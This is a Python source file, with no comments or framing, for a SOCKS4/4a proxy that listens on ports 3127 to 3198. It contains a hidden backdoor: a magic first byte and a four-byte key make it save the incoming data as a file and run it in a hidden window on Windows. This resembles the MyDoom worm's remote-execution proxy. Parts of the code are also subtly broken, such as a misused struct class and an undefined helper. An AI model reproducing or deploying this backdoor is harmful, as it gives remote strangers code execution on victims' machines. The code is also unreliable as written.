import socket
import threading
import struct
import os
import platform
import subprocess
import select
import time

PAD1 = b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC" \
       b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC" \
       b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC" \
       b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC" \
       b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC" \
       b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC" \
       b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC" \
       b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC" \
       b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC" \
       b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC" \
       b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC" \
       b"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"

SOCKS4_SUCCEEDED = 90
SOCKS4_REJECTED = 91
SOCKS4_EXECBYTE = 133

class Socks4Header(struct.Struct):
    _fields_ = [
        ('vn', struct.pack('B', 0)),
        ('cd', struct.pack('B', 0)),
        ('dstport', struct.pack('!H', 0)),
        ('dstip', struct.pack('!I', 0)),
    ]

def recv_bytes(sock, length):
    buf = b''
    while len(buf) < length:
        data = sock.recv(length - len(buf))
        if not data:
            return None
        buf += data
    return buf

def sends(sock, data):
    sock.sendall(data)

def socks4_exec(sock):
    data = recv_bytes(sock, 1)  # skip header byte
    if not data:
        return

    data = recv_bytes(sock, 4)
    if not data:
        return

    dw = struct.unpack('!I', data)[0]
    if dw != 0x133C9EA2:
        return

    temppath = os.path.join(os.path.dirname(__file__), 'tempfile')
    with open(temppath, 'wb') as f:
        while True:
            data = recv_bytes(sock, 1024)
            if not data:
                break
            f.write(data)

    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE
    cmd = f'"{temppath}"'
    if platform.system().lower() == 'windows':
        subprocess.call(cmd, startupinfo=si)
    os.remove(temppath)
    sock.close()

def parse_socks4a(sock):
    hostname = b''
    while len(hostname) < 255:
        data = sock.recv(1)
        if not data:
            return None
        if data == b'\x00':
            break
        hostname += data

    try:
        ip = socket.inet_aton(hostname)
    except socket.error:
        try:
            ip = socket.gethostbyname(hostname)
        except socket.gaierror:
            return None

    return ip

def relay_socks(sock1, sock2):
    inputs = [sock1, sock2]
    try:
        while True:
            readable, _, _ = select.select(inputs, [], [])
            for s in readable:
                data = s.recv(4096)
                if not data:
                    return
                if s is sock1:
                    sock2.sendall(data)
                else:
                    sock1.sendall(data)
    except:
        pass

def socks4_client(sock):
    data = sock.recv(1, socket.MSG_PEEK)
    if not data:
        return

    if data == bytes([SOCKS4_EXECBYTE]):
        socks4_exec(sock)
        sock.close()
        return

    if data != b'\x04':
        return

    data = sock.recv(Socks4Header.size)
    if not data:
        return

    header = Socks4Header(*struct.unpack_from('BBHI', data))
    if skip_until(sock, b'\x00'):
        return

    if header.vn != 0x04:
        return

    if header.cd != 0x01:
        return  # BIND method is not supported

    if header.dstip != 0 and (socket.ntohl(header.dstip) & 0xFFFFFF00) == 0:  # 0.0.0.xxx, xxx!=0
        # SOCKS4A extension...
        ip = parse_socks4a(sock)
        if not ip:
            return
        header.dstip = struct.unpack('!I', ip)[0]

    addr = (socket.inet_ntoa(struct.pack('!I', header.dstip)), header.dstport)
    try:
        relay = socket.create_connection(addr)
    except socket.error:
        return

    header.vn = 0x04
    header.cd = SOCKS4_SUCCEEDED  # success
    sends(sock, header.pack())

    relay_socks(sock, relay)

def socks4_server(port):
    serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    serv.bind(('0.0.0.0', port))
    serv.listen(50)

    while True:
        sock, _ = serv.accept()
        if not sock:
            continue
        threading.Thread(target=socks4_client, args=(sock,)).start()

def xproxy_th(pv):
    port = 3127
    while True:
        socks4_server(port)
        time.sleep(1)
        if port > 3198:
            time.sleep(2)
            port = 3127
        else:
            port += 1

if __name__ == "__main__":
    threading.Thread(target=xproxy_th, args=(None,)).start()
